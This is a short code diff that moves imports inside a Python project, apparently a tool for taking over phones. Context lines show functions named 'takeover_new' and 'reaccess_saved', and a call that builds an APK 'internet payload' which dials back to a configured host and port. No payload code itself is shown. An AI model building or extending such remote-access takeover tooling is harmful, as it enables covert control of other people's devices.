@@ -19,9 +19,9 @@ import subprocess
 import time
 from pathlib import Path
 
-from modules import remoteshell
-from control_room.config import AppConfig
-from control_room.console import (
+from control_room.ops import remoteshell
+from control_room.core.config import AppConfig
+from control_room.cli.console import (
     console,
     ask,
     confirm,
@@ -150,7 +150,7 @@ def takeover_new(config: AppConfig) -> None:
     if pm:
         print_warning("portmap configured — building internet payload for this phone…")
         try:
-            from modules import pivot
+            from control_room.net import pivot
 
             apk = remoteshell.build_fgs_payload(pm.get("dial_host", "127.0.0.1"), pm["public_port"])
             if apk:
@@ -225,7 +225,7 @@ def _pick_idx(devs) -> int | None:
 # --------------------------------------------------------------------------
 
 def reaccess_saved(config: AppConfig) -> None:
-    from modules import reaccess
+    from control_room.net import reaccess
 
     devs = load_store()
     if devs:
